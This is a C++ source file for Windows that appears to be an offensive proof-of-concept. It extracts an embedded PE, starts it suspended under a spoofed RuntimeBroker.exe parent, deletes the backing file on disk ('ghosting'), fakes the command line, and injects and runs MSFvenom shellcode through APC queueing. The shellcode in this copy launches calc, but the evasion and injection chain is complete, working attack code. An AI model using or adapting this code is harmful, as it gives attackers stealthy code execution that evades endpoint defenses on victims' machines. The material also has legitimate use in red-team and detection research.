#include "Main.hpp"



std::tuple<HANDLE, std::wstring> CreateTemporaryFile() {

	wchar_t TempDir[MAX_PATH] = { 0 };
	wchar_t FileName[MAX_PATH] = { 0 };
	HANDLE hFile = nullptr;


	std::cout << "[+] Creating temp file to hold the PE..." << std::endl;
	if (!GetTempPathW(MAX_PATH, TempDir)) {
		WIN32_ERR(GetTempPathW);
		return std::make_tuple(INVALID_HANDLE_VALUE, L"");
	}


	if (!GetTempFileNameW(TempDir, L"UR", 0, FileName)) {
		WIN32_ERR(GetTempFileNameW);
		return std::make_tuple(INVALID_HANDLE_VALUE, L"");
	}


	hFile = CreateFileW(
		FileName,
		GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		WIN32_ERR(CreateFileW);
		return std::make_tuple(INVALID_HANDLE_VALUE, L"");
	}


	return std::make_tuple(hFile, FileName);
}



void* GetStoredExecutableImage(_Out_ std::uint32_t& ImageSize) {

	HRSRC hRsrc = nullptr;
	HGLOBAL hGlobal = nullptr;
	void* ResourceAddress = nullptr;
	std::uint32_t ResourceSize = 0;


	std::cout << "[+] Retrieving PE file from .rsrc section..." << std::endl;
	hRsrc = FindResourceW(
		nullptr,
		MAKEINTRESOURCEW(IDR_RCDATA1),
		RT_RCDATA);

	if (!hRsrc)
		return nullptr;

	hGlobal = LoadResource(nullptr, hRsrc);
	if (!hGlobal)
		return nullptr;

	ResourceAddress = LockResource(hGlobal);
	if (!ResourceAddress)
		return nullptr;

	ResourceSize = SizeofResource(nullptr, hRsrc);
	if (!ResourceSize)
		return nullptr;


	ImageSize = ResourceSize;
	return ResourceAddress;
}



HANDLE EnumerateRuntimeBrokerProcess() {

	uint32_t PidArray[2048] = { 0 };		wchar_t moduleBaseName[250] = { 0 };
	uint32_t sModulebaseName = 0;			uint32_t bytesReturned = 0;
	uint32_t bytesNeeded = 0;			uint32_t totalNumberOfPids = 0;

	HANDLE hProcess = nullptr;
	HMODULE hModule = nullptr;
	bool foundProcess = false;


	if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
		WIN32_ERR(K32EnumProcesses);
		return nullptr;
	}

	totalNumberOfPids = bytesReturned / sizeof(uint32_t);


	std::cout << "[+] Locating Fake Parent Process..." << std::endl;
	for (size_t i = 0; i < totalNumberOfPids; i++) {

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PidArray[i]);
		if (hProcess == nullptr) {
			continue;
		}

		uint32_t moduleEnumBytesNeeded = 0;
		if (!K32EnumProcessModules(hProcess, &hModule, sizeof(hModule), (LPDWORD)&moduleEnumBytesNeeded)) {
			continue;
		}

		if (!K32GetModuleBaseNameW(hProcess, hModule, moduleBaseName, sizeof(moduleBaseName) / sizeof(wchar_t))) {
			continue;
		}

		if (wcscmp(moduleBaseName, L"RuntimeBroker.exe") == 0) {

			std::cout << "[+] Located RuntimeBroker.exe Parent Process." << std::endl;
			foundProcess = true;
			break;
		}

		memset(moduleBaseName, 0x00, sizeof(moduleBaseName));
	}

	if (!foundProcess) {
		std::cout << "[!] Failed. Current process will be used instead." << std::endl;
	}

	return(foundProcess ? hProcess : nullptr);
}



std::uint32_t GetCodeRva(byte* RawFileBuffer) {

	PIMAGE_DOS_HEADER pImgDosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(RawFileBuffer);
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return 0x00;


	PIMAGE_NT_HEADERS pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>\
		(RawFileBuffer + pImgDosHdr->e_lfanew);

	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;


	return pImgNtHdrs->OptionalHeader.BaseOfCode;
}



std::wstring GetFakeCommandLineArguments() {

	wchar_t WindowsDirectory[MAX_PATH] = { 0 };

	if (!GetWindowsDirectoryW(WindowsDirectory, MAX_PATH)) {
		return L"";
	}

	std::wstring ToReturn = WindowsDirectory;
	ToReturn += L"\\System32\\RuntimeBroker.exe -Embedding";

	return ToReturn;
}




/* MSFvenom Calc Payload */
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};


int main() {

	/* Local Variables */
	std::tuple<HANDLE, std::wstring> TempFile;
	std::tuple<HANDLE, HANDLE, std::uint32_t> SuspendedProcess;
	std::wstring FakeCommandLine;

	void* ResourcePtr = nullptr;
	byte* ImageHeapBuffer = nullptr;
	HANDLE ParentProcess = nullptr;
	
	std::uint32_t ResourceSize = 0;
	std::uint32_t CodeRva = 0;
	std::uint32_t BytesWritten = 0;


	ParentProcess = EnumerateRuntimeBrokerProcess();


	//
	// Create temporary file
	//

	TempFile = CreateTemporaryFile();
	if (std::get<0>(TempFile) == INVALID_HANDLE_VALUE)
		return -1;



	//
	// Get stored PE file
	//

	ResourcePtr = GetStoredExecutableImage(ResourceSize);
	if (ResourcePtr == nullptr || !ResourceSize)
		return -1;



	//
	// Write PE file into .tmp file 
	//

	ImageHeapBuffer = static_cast<byte*>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		ResourceSize));

	if (!ImageHeapBuffer)
		return -1;

	
	memcpy(ImageHeapBuffer, ResourcePtr, ResourceSize);
	
	std::cout << "[+] Writing PE into .tmp file..." << std::endl;
	if (!WriteFile(
		std::get<0>(TempFile),
		ImageHeapBuffer,
		ResourceSize,
		(LPDWORD)&BytesWritten,
		nullptr
	) || BytesWritten != ResourceSize) {

		WIN32_ERR(WriteFile);
		return -1;
	}



	//
	// Create suspended process.
	// NOTE: to prevent sharing violations we must close the file handle first.
	//

	CloseHandle(std::get<0>(TempFile));
	SuspendedProcess = CreateSuspendedProcess(std::get<1>(TempFile).c_str(), ParentProcess);
	if (std::get<0>(SuspendedProcess) == nullptr)
		return -1;



	//
	// Ghost the file on disk.
	//

	if (!DataStreamExploitDeleteFile(std::get<1>(TempFile).c_str()))
		return -1;

	std::cout << "[+] Created child process with PID: " << std::get<2>(SuspendedProcess) << std::endl;
	std::cout << "[+] Successfully deleted the .tmp file on disk." << std::endl;



	//
	// Spoof Command-Line Arguments.
	//

	FakeCommandLine = std::move(GetFakeCommandLineArguments());
	if (FakeCommandLine == L"")
		return -1;

	if (!SpoofCommandLine(FakeCommandLine.c_str(), std::get<0>(SuspendedProcess)))
		return -1;



	//
	// Copy Payload Into Process At RWX region.
	//

	byte* RemoteImageBase = RetrieveImageBase(std::get<0>(SuspendedProcess));
	if (RemoteImageBase == nullptr)
		return -1;

	if (!CopyPayloadIntoProcess(
		std::get<0>(SuspendedProcess),
		RemoteImageBase + GetCodeRva(ImageHeapBuffer),
		Payload,
		sizeof(Payload) 
	)) {
		return -1;
	}



	//
	// Run payload via APC queueing
	//

	std::cout << "\n[+] Press <ENTER> to run the payload and finish." << std::endl;
	std::cin.get();

	if (!QueueUserApcRunPayload(
		std::get<1>(SuspendedProcess),
		RemoteImageBase + GetCodeRva(ImageHeapBuffer) 
	)) {

		return -1;
	}

	std::cout << "\n[+] Finished successfully. Exiting..." << std::endl;
	return 0;
}